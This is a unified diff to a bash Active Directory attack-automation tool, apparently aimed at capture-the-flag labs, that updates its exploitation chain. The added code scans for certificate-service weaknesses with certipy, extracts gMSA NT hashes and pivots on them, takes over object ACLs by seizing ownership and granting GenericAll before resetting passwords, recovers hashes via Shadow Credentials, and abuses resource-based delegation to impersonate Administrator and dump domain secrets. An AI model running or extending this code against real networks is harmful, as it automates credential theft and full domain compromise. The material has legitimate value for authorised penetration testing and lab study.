@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.9.0"
+readonly VERSION="1.10.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -158,8 +158,9 @@ declare -A SPRAYED=()             # password→done, so we don't spray twice
 # the same document / roast+crack the same account five times over.
 declare -A CRACKED_DOCS=()        # doc basename → already cracked/attempted
 declare -A TRIED_HASHES=()        # per-account (krb) or per-hash (ntlm) → already cracked-attempted
-declare -A OWNED_GROUPS=()        # compromised user → comma-joined group memberships
-declare -A OWNED_ADMIN=()         # compromised user → 1 if in a privileged/admin group
+declare -A OWNED_GROUPS=()        # compromised user (lowercased) → group memberships
+declare -A OWNED_ADMIN=()         # compromised user (lowercased) → 1 if privileged/admin
+declare -A REQUEUED_SELF=()       # user (lc) re-assessed once after a self-group-add (no loops)
 KERB_DONE=0                       # Kerberoast request runs once (SPN set is domain-wide)
 # Groups that mean "this account is effectively privileged" → crown it in the summary
 ADMIN_GROUP_RE='Domain Admins|Enterprise Admins|Schema Admins|Administrators|Account Operators|Backup Operators|Server Operators|Print Operators|DnsAdmins|Group Policy Creator Owners|Enterprise Key Admins|Key Admins|Domain Controllers'
@@ -254,6 +255,10 @@ queue_cred() {  # queue_cred <user> <password|""> <nthash|"">
     fi
     local key="${u,,}"
     [[ -n "${SEEN_CREDS[$key]:-}" ]] && return   # already assessed this identity
+    # Also skip if it's already waiting in the queue (case-insensitive): tools
+    # report names in different cases (kerbrute 'Alfred' vs nxc 'alfred') and
+    # several sources queue the same lead, which otherwise got assessed twice.
+    local q qu; for q in "${CRED_QUEUE[@]}"; do qu="${q%%|*}"; [[ "${qu,,}" == "$key" ]] && return; done
     CRED_QUEUE+=("${u}|${p}|${h}")
     loot "New identity queued for pivoting → ${C_BOLD}${u}${C_RESET}$( [[ -n "$p" ]] && echo " (password)" || echo " (NT hash)")"
 }
@@ -823,18 +828,28 @@ phase_adcs() {
     have certipy || { warn "certipy unavailable, skipping"; return; }
 
     subsection "certipy find — scanning for ESC1..ESC16"
-    local cargs=(-u "${USER}@${DOMAIN}" -dc-ip "$DC_IP" -stdout -vulnerable)
-    [[ -n "$HASH" ]] && cargs+=(-hashes ":$HASH")
-    [[ -n "$PASS" ]] && cargs+=(-p "$PASS")
-    [[ "$KERBEROS" == "1" ]] && cargs+=(-k)
-    run "certipy find ${cargs[*]}"
-    local cout; cout=$(certipy find "${cargs[@]}" 2>&1); echo "$cout" | tee -a "$LOGFILE"
-    echo "$cout" >"$OUTDIR/certipy_find.txt"
+    # certipy's Kerberos LDAP bind is unreliable (fails with 'invalidCredentials …
+    # data 52e/57'), and most labs keep NTLM enabled — so PREFER password/hash auth
+    # and hand certipy the DC's DNS name via -target (it needs it). Fall back to
+    # Kerberos (with -dc-host + KRB5CCNAME) only when that's all we have, or when
+    # the password/NTLM bind is refused (NTLM disabled, e.g. Voleur).
+    local cbase=(-u "${USER}@${DOMAIN}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}") cauth=() cenv=()
+    if   [[ -n "$PASS" ]]; then cauth=(-p "$PASS")
+    elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH")
+    elif [[ -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET"); fi
+    run "certipy find ${cbase[*]} ${cauth[*]} -stdout -vulnerable"
+    local cout; cout=$("${cenv[@]}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
+    # Password/NTLM bind refused but we have a ticket → retry over Kerberos.
+    if grep -qiE 'authentication failed|invalidCredentials|NTLM.*failed|STATUS_' <<<"$cout" \
+       && [[ -n "$KERB_TICKET" && "${cauth[0]}" != "-k" ]]; then
+        warn "certipy password/NTLM bind failed → retrying over Kerberos"
+        cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET")
+        cout=$("${cenv[@]}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
+    fi
+    echo "$cout" | tee -a "$LOGFILE"; echo "$cout" >"$OUTDIR/certipy_find.txt"
 
     # full structured output (BloodHound + JSON) for later analysis
-    certipy find -u "${USER}@${DOMAIN}" \
-        $([[ -n "$HASH" ]] && echo "-hashes :$HASH") $([[ -n "$PASS" ]] && echo "-p $PASS") \
-        -dc-ip "$DC_IP" -output "$OUTDIR/certipy" >/dev/null 2>&1
+    "${cenv[@]}" certipy find "${cbase[@]}" "${cauth[@]}" -output "$OUTDIR/certipy" >/dev/null 2>&1
 
     if echo "$cout" | grep -qiE 'ESC[0-9]+'; then
         local escs; escs=$(echo "$cout" | grep -oiE 'ESC[0-9]+' | sort -u | tr '\n' ' ')
@@ -938,11 +953,19 @@ phase_secrets() {
     run "$NXC ldap $DCT ${args[*]} --gmsa"
     local gmsa; gmsa=$($NXC ldap "$DCT" "${args[@]}" --gmsa 2>&1); echo "$gmsa" | tee -a "$LOGFILE"
     echo "$gmsa" | grep -iE 'Account:|NTLM:' >"$OUTDIR/gmsa.txt"
-    # Queue any gMSA account whose NT hash we recovered
-    while read -r acc; do
-        local h; h=$(echo "$gmsa" | grep -i "$acc" | grep -oP 'NTLM:\s*\K[a-f0-9]{32}' | head -1)
-        [[ -n "$h" ]] && { loot "★ gMSA hash recovered for $acc"; queue_cred "$acc" "" "$h"; }
-    done < <(echo "$gmsa" | grep -oP "Account:\s*\K\S+(?=.*NTLM:\s*\S+)" 2>/dev/null)
+    # Queue any gMSA account whose NT hash we recovered. Parse each line as a unit:
+    # the account ends in '$' (machine account), so the old `grep -i "$acc"` lookup
+    # treated that '$' as a regex end-anchor and never matched → the hash was
+    # dropped and ansible_dev$ (and friends) never got pivoted.
+    while IFS= read -r line; do
+        local acc h
+        acc=$(grep -oiP 'Account:\s*\K\S+'        <<<"$line" | head -1)
+        h=$(grep -oiP 'NTLM:\s*\K[a-fA-F0-9]{32}' <<<"$line" | head -1)
+        [[ -n "$acc" && -n "$h" ]] && {
+            loot "★ gMSA hash recovered for ${C_BOLD}$acc${C_RESET}: ${C_MAGENTA}$h${C_RESET}"
+            note_cred_source "$acc" "gMSA password read (NT hash)"
+            queue_cred "$acc" "" "$h"; }
+    done < <(echo "$gmsa" | grep -iE 'Account:.*NTLM:')
 }
 
 # ===========================================================================
@@ -1036,6 +1059,11 @@ phase_trusts() {
     # Identify partner domains
     local partners; partners=$(grep -oiP 'trustPartner:\s*\K\S+' "$tf" 2>/dev/null | sort -u)
     [[ -z "$partners" ]] && partners=$(grep -oiP '(Target|Partner|Domain)\s*:?\s*\K[a-z0-9.-]+\.[a-z]{2,}' "$tf" 2>/dev/null | sort -u)
+    # Drop the current domain. bloodyAD/enum_trusts/ldapsearch all echo our own
+    # name (and FSP DNs like DC=tombwatcher,DC=htb), and the loose fallback regex
+    # would otherwise mistake it for a "trust" → we'd kerberoast ourselves and
+    # print bogus cross-forest paths. A single-domain forest has no partners.
+    partners=$(printf '%s\n' "$partners" | grep -vixF "$DOMAIN" | grep -vE '^[[:space:]]*$')
 
     if [[ -z "$partners" ]]; then
         info "No external/forest trusts found from this domain"
@@ -1048,8 +1076,18 @@ phase_trusts() {
     subsection "Foreign Security Principals (accounts from trusted domains with access here)"
     if have bloodyAD; then
         local ba; mapfile -t ba < <(bloody_args)
-        bloodyAD "${ba[@]}" get search --filter '(objectClass=foreignSecurityPrincipal)' --attr cn 2>&1 \
-            | tee -a "$LOGFILE" | tee -a "$tf"
+        local fsp; fsp=$(bloodyAD "${ba[@]}" get search --filter '(objectClass=foreignSecurityPrincipal)' --attr cn 2>&1)
+        printf '%s\n' "$fsp" >>"$tf"
+        # Only real foreign principals are domain SIDs (S-1-5-21-…). Every domain
+        # also has built-in well-known SIDs in this container (S-1-5-4 Interactive,
+        # S-1-5-9 Enterprise DCs, S-1-5-11 Authenticated Users, S-1-5-17 IUSR…) —
+        # they're not actionable, so don't surface them as "foreign access".
+        local realfsp; realfsp=$(grep -oiE 'S-1-5-21-[0-9-]+' <<<"$fsp" | sort -u)
+        if [[ -n "$realfsp" ]]; then
+            while read -r s; do echo -e "      ${C_CYAN}$s${C_RESET}"; done <<<"$realfsp"
+        else
+            info "Only built-in well-known SIDs present — no actionable foreign principals"
+        fi
     fi
 
     subsection "Cross-forest exploitation paths"
@@ -1142,7 +1180,7 @@ phase_winrm_dpapi() {
             local u_re; u_re=$(printf '%s' "$USER" | sed 's/[][\.^$*+?(){}|]/\\&/g')
             grep -qiE "(\\\\|[[:space:]])${u_re}([[:space:]]|\$)" <<<"$rmu" && can_winrm=1
         fi
-        [[ -n "${OWNED_ADMIN[$USER]:-}" ]] && can_winrm=1   # admins can always WinRM
+        [[ -n "${OWNED_ADMIN[${USER,,}]:-}" ]] && can_winrm=1   # admins can always WinRM
 
         if [[ "$can_winrm" == "1" ]]; then
             loot "★ ${USER} has WinRM shell access!"
@@ -1208,18 +1246,19 @@ bloody_args() {
 # can read it, so it works for every owned account, not just WinRM-capable ones.
 record_owned_identity() {
     [[ "$HAVE_AUTH" != "1" || -z "$USER" ]] && return
-    [[ -n "${OWNED_GROUPS[$USER]:-}" ]] && return         # already recorded this pass
+    local key="${USER,,}"                                  # case-insensitive: Alfred == alfred
+    [[ -n "${OWNED_GROUPS[$key]:-}" ]] && return           # already recorded this principal
     local groups="" ba
     if have bloodyAD && [[ "$CAP_LDAP" == "1" ]]; then
         mapfile -t ba < <(bloody_args)
         groups=$(bloodyAD "${ba[@]}" get object "$USER" --attr memberOf 2>/dev/null \
                  | grep -oiP 'CN=\K[^,]+' | paste -sd', ' -)
     fi
-    OWNED_GROUPS["$USER"]="${groups:-—}"
+    OWNED_GROUPS["$key"]="${groups:-—}"
     local admin=0
     grep -qiE "$ADMIN_GROUP_RE" <<<"$groups" && admin=1
-    [[ "${USER,,}" == "administrator" ]] && admin=1
-    [[ "$admin" == "1" ]] && OWNED_ADMIN["$USER"]=1
+    [[ "$key" == "administrator" ]] && admin=1
+    [[ "$admin" == "1" ]] && OWNED_ADMIN["$key"]=1
     printf '%s\t%s\t%s\n' "$USER" "$([[ $admin == 1 ]] && echo ADMIN || echo user)" "${groups:-—}" \
         >>"$OUTDIR/owned_principals.txt"
 }
@@ -1294,7 +1333,7 @@ phase_acl() {
                 if [[ "$cur_class" == "domain" ]]; then _abuse_dcsync_dacl
                 elif [[ "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ]]; then _abuse_group "$tgt"
                 elif [[ "$cur_class" == "computer" || "$tgt" == *\$ ]]; then _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt"
-                else _abuse_shadowcred "$tgt" || _abuse_user "$tgt"; fi ;;
+                else _abuse_user_smart "$tgt"; fi ;;
         esac
     done <<<"$w"
 }
@@ -1309,9 +1348,16 @@ _abuse_group() {
         loot "★ Added ${USER} to '${grp}' — re-enumerating with new privileges"
         rb_record "Added $USER to group $grp" \
                   "bloodyAD ${ba[*]} remove groupMember '$grp' '$USER'"
-        # same identity, more rights → re-assess by re-queueing self (force re-run)
-        unset 'SEEN_CREDS[${USER,,}]'
-        queue_cred "$USER" "$PASS" "$HASH"
+        # same identity, more rights → re-assess ONCE by re-queueing self. Guard
+        # against looping: without this, the re-assessment re-detects the same
+        # group-write and re-queues again and again (Alfred got pwned 4×).
+        if [[ -z "${REQUEUED_SELF[${USER,,}]:-}" ]]; then
+            REQUEUED_SELF["${USER,,}"]=1
+            unset "SEEN_CREDS[${USER,,}]"
+            queue_cred "$USER" "$PASS" "$HASH"
+        else
+            info "  (already re-assessed ${USER} once with new group rights — not looping)"
+        fi
     else
         warn "Failed to add to '$grp' (rights may not cover membership)"
     fi
@@ -1328,9 +1374,46 @@ _abuse_user() {
         rb_record "Reset password of $target (ORIGINAL UNKNOWN — coordinate restore with client)" \
                   "echo 'Manual action required: restore original password for $target'"
         queue_cred "$target" "$PIVOT_PW" ""
+        return 0
     else
         warn "Failed to reset '$target' password"
+        return 1
     fi
+}
+
+# Take over an object's ACL when we hold WriteOwner / WriteDACL (but not yet a
+# usable right): become owner if needed, grant ourselves GenericAll, then drive
+# the normal reset/shadow. This is the missing link in chains like
+# WriteOwner→GenericAll→reset (e.g. sam → john on TombWatcher).
+_abuse_acl_takeover() {
+    local target="$1"; local ba; mapfile -t ba < <(bloody_args)
+    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to take over ACL of '$target' → GenericAll → reset)"; return 1; }
+    confirm "  Take over '${target}' (set owner if needed, grant ${USER} GenericAll, then reset)?" || return 1
+    # 1) Try to grant ourselves GenericAll directly (works if we hold WriteDACL or
+    #    already own the object). If that's refused, take ownership first.
+    if ! bloodyAD "${ba[@]}" add genericAll "$target" "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|granted|added|modif|written'; then
+        run "bloodyAD ${ba[*]} set owner '$target' '$USER'"
+        if ! bloodyAD "${ba[@]}" set owner "$target" "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|owner|changed|modif|written'; then
+            warn "Could not take ownership of '$target'"; return 1
+        fi
+        rb_record "Set owner of $target to $USER" "echo 'Manual: restore original owner of $target'"
+        if ! bloodyAD "${ba[@]}" add genericAll "$target" "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|granted|added|modif|written'; then
+            warn "Took ownership but could not grant GenericAll over '$target'"; return 1
+        fi
+    fi
+    rb_record "Granted $USER GenericAll over $target" "bloodyAD ${ba[*]} remove genericAll '$target' '$USER'"
+    loot "★ Took over ACL of '${target}' (owner/GenericAll) → reset / shadow"
+    _abuse_shadowcred "$target" || _abuse_user "$target"
+}
+
+# Smart takeover of a user we have full/partial control over: non-destructive
+# Shadow Credentials first, then a direct password reset (GenericAll /
+# ForceChangePassword), and only if those fail, a WriteOwner/WriteDACL takeover.
+_abuse_user_smart() {
+    local target="$1"
+    _abuse_shadowcred "$target" && return 0
+    _abuse_user "$target"       && return 0
+    _abuse_acl_takeover "$target"
 }
 
 # Shadow Credentials (msDS-KeyCredentialLink) → recover target's NT hash via PKINIT.
@@ -1341,12 +1424,20 @@ _abuse_shadowcred() {
     have certipy || return 1
     [[ "$DO_ABUSE" != "1" ]] && { info "  (--abuse to try Shadow Credentials on '$target')"; return 1; }
     confirm "  Shadow Credentials on '${target}' (non-destructive, recovers its hash)?" || return 1
-    local cargs=(-u "${USER}@${DOMAIN}" -account "$target" -dc-ip "$DC_IP" -ns "$DC_IP")
-    if   [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]]; then cargs+=(-k -no-pass)
-    elif [[ -n "$HASH" ]]; then cargs+=(-hashes ":$HASH")
-    else cargs+=(-p "$PASS"); fi
-    run "certipy shadow auto ${cargs[*]}"
-    local out; out=$(certipy shadow auto "${cargs[@]}" 2>&1); echo "$out" | tee -a "$LOGFILE"
+    # Prefer password/hash (certipy Kerberos is flaky); -target/-dc-host + ccache
+    # only as fallback. Mirrors phase_adcs so shadow works on NTLM-on labs too.
+    local cbase=(-u "${USER}@${DOMAIN}" -account "$target" -dc-ip "$DC_IP" -ns "$DC_IP" -target "${DC_FQDN:-$DCT}") cauth=() cenv=()
+    if   [[ -n "$PASS" ]]; then cauth=(-p "$PASS")
+    elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH")
+    elif [[ -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET"); fi
+    run "certipy shadow auto ${cbase[*]} ${cauth[*]}"
+    local out; out=$("${cenv[@]}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
+    if grep -qiE 'authentication failed|invalidCredentials|NTLM.*failed|No credentials provided' <<<"$out" \
+       && [[ -n "$KERB_TICKET" && "${cauth[0]}" != "-k" ]]; then
+        cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET")
+        out=$("${cenv[@]}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
+    fi
+    echo "$out" | tee -a "$LOGFILE"
     local nt; nt=$(echo "$out" | grep -oiP "Got hash for .*:\s*\K\S+" | awk -F: '{print $NF}' | head -1)
     if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
         loot "★ Shadow Credentials → NT hash of ${C_BOLD}$target${C_RESET}: ${C_MAGENTA}$nt${C_RESET}"
@@ -1360,34 +1451,41 @@ _abuse_shadowcred() {
 # Resource-Based Constrained Delegation: write msDS-AllowedToActOnBehalfOf… on a
 # computer we control, then impersonate Administrator to it.
 _abuse_rbcd() {
-    local target="$1"   # computer object we can write (e.g. DC$)
+    local target="$1"   # must be a COMPUTER object we can write (e.g. DC$)
     [[ "$DO_ABUSE" != "1" ]] && { info "  (--abuse to try RBCD on '$target')"; return 1; }
-    have impacket-getST || return 1
+    # RBCD needs the target to have an SPN to request a service ticket to — i.e. a
+    # computer account. Writing the attribute on a user is a dead end, so don't
+    # waste a machine-account creation + noisy traceback on it.
+    [[ "$target" != *\$ ]] && { info "  RBCD not applicable to user '$target' (computer accounts only)"; return 1; }
+    have impacket-getST && have impacket-addcomputer || return 1
     confirm "  RBCD on '${target}' (creates a machine account if MachineAccountQuota>0)?" || return 1
     local ba; mapfile -t ba < <(bloody_args)
-    local comp="adpwn\$" cpass="ADAutoPwn_RBCD_123!"
+    local cpass="ADAutoPwn_RBCD_123!" dch="${DC_FQDN:-$DCT}"
     run "impacket-addcomputer (adpwn\$) via $USER"
-    local addargs=("$DOMAIN/$USER" -dc-ip "$DC_IP" -computer-name 'adpwn$' -computer-pass "$cpass")
-    [[ -n "$HASH" ]] && addargs+=(-hashes ":$HASH"); [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]] && addargs+=(-k -no-pass)
-    if [[ -n "$PASS" && -z "$HASH" && -z "$KERB_TICKET" ]]; then
-        impacket-addcomputer "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1 | tee -a "$LOGFILE"
-    else
-        impacket-addcomputer "${addargs[@]}" 2>&1 | tee -a "$LOGFILE"
+    # Kerberos addcomputer REQUIRES -dc-host (DNS name), or it errors out.
+    local addout
+    if   [[ -n "$HASH" ]]; then addout=$(impacket-addcomputer "$DOMAIN/$USER" -hashes ":$HASH" -dc-ip "$DC_IP" -dc-host "$dch" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1)
+    elif [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]]; then addout=$(KRB5CCNAME="$KERB_TICKET" impacket-addcomputer "$DOMAIN/$USER" -k -no-pass -dc-ip "$DC_IP" -dc-host "$dch" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1)
+    else addout=$(impacket-addcomputer "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -dc-host "$dch" -computer-name 'adpwn$' -computer-pass "$cpass" 2>&1); fi
+    echo "$addout" | tee -a "$LOGFILE"
+    if ! grep -qiE 'Successfully added|added the machine account' <<<"$addout"; then
+        warn "Could not add machine account (MachineAccountQuota=0 or no rights) → RBCD not possible from $USER"
+        return 1
     fi
-    rb_record "Created machine account adpwn\$" "bloodyAD ${ba[*]} remove dnsRecord 2>/dev/null; impacket-addcomputer '$DOMAIN/$USER' -dc-ip '$DC_IP' -computer-name 'adpwn\$' -delete"
+    rb_record "Created machine account adpwn\$" "impacket-addcomputer '$DOMAIN/$USER' -dc-ip '$DC_IP' -dc-host '$dch' -computer-name 'adpwn\$' -delete 2>/dev/null"
     run "bloodyAD add rbcd '$target' 'adpwn\$'"
     bloodyAD "${ba[@]}" add rbcd "$target" 'adpwn$' 2>&1 | tee -a "$LOGFILE"
     rb_record "Set RBCD on $target → adpwn\$" "bloodyAD ${ba[*]} remove rbcd '$target' 'adpwn\$'"
     local svc="cifs/${target%\$}.${DOMAIN}"
     run "impacket-getST -spn $svc -impersonate Administrator $DOMAIN/adpwn\$"
-    rm -f "Administrator@${svc/\//_}@${DOMAIN^^}.ccache" "Administrator.ccache" 2>/dev/null
-    impacket-getST -spn "$svc" -impersonate Administrator "$DOMAIN/adpwn\$:$cpass" -dc-ip "$DC_IP" 2>&1 | tee -a "$LOGFILE"
-    local st; st=$(ls -t *.ccache 2>/dev/null | head -1)
-    if [[ -n "$st" ]]; then
-        mv -f "$st" "$OUTDIR/rbcd_admin.ccache" 2>/dev/null
+    local stout; stout=$(impacket-getST -spn "$svc" -impersonate Administrator "$DOMAIN/adpwn\$:$cpass" -dc-ip "$DC_IP" -dc-host "$dch" 2>&1); echo "$stout" | tee -a "$LOGFILE"
+    # Real success only — getST prints "Saving ticket in <file>". Don't fall for a
+    # stale .ccache lying in CWD (that produced bogus "RBCD succeeded" before).
+    local stfile; stfile=$(grep -oiP 'Saving ticket in \K\S+\.ccache' <<<"$stout" | head -1)
+    if [[ -n "$stfile" && -f "$stfile" ]] && ! grep -qiE 'KDC_ERR|SessionError|does not have' <<<"$stout"; then
+        mv -f "$stfile" "$OUTDIR/rbcd_admin.ccache" 2>/dev/null
         loot "★ RBCD → Administrator service ticket for $target → rbcd_admin.ccache"
         note_cred_source "Administrator@$target" "RBCD impersonation"
-        # If the target is the DC, that ticket is enough to DCSync
         if [[ "${target%\$}" == "$DC_HOST" ]]; then
             subsection "RBCD ticket targets the DC → secretsdump"
             KRB5CCNAME="$OUTDIR/rbcd_admin.ccache" impacket-secretsdump -k -no-pass "${DC_FQDN}" -just-dc \
@@ -1395,7 +1493,7 @@ _abuse_rbcd() {
         fi
         return 0
     fi
-    warn "RBCD did not produce a ticket for $target"; return 1
+    warn "RBCD did not produce a usable ticket for $target"; return 1
 }
 
 # Targeted Kerberoast via WriteSPN: set a temp SPN, roast, then remove it
@@ -3448,6 +3546,17 @@ main() {
     if [[ -s "$OUTDIR/found_passwords.txt" ]]; then
         while IFS= read -r p; do [[ -n "$p" ]] && FOUND_SECRETS["$p"]=1; done <"$OUTDIR/found_passwords.txt"
         info "Resumed $(wc -l <"$OUTDIR/found_passwords.txt") previously recovered passwords"
+    fi
+    # Resume: don't re-pwn identities already compromised on this loot dir. Loading
+    # them into SEEN_CREDS makes process_queue skip them, so re-running (e.g. with
+    # --creds-file adding a new lead) continues the chain instead of redoing every
+    # account we already owned.
+    if [[ -s "$OUTDIR/owned_principals.txt" ]]; then
+        local _ou _n=0
+        while IFS=$'\t' read -r _ou _; do
+            [[ -n "$_ou" ]] && { SEEN_CREDS["${_ou,,}"]=1; _n=$((_n+1)); }
+        done <"$OUTDIR/owned_principals.txt"
+        [[ "$_n" -gt 0 ]] && info "Resume: $_n already-owned identity/identities will be skipped (won't re-pwn)"
     fi
     # Merge an externally-supplied user list (for spray / AS-REP)
     if [[ -n "$USERS_FILE" && -s "$USERS_FILE" ]]; then
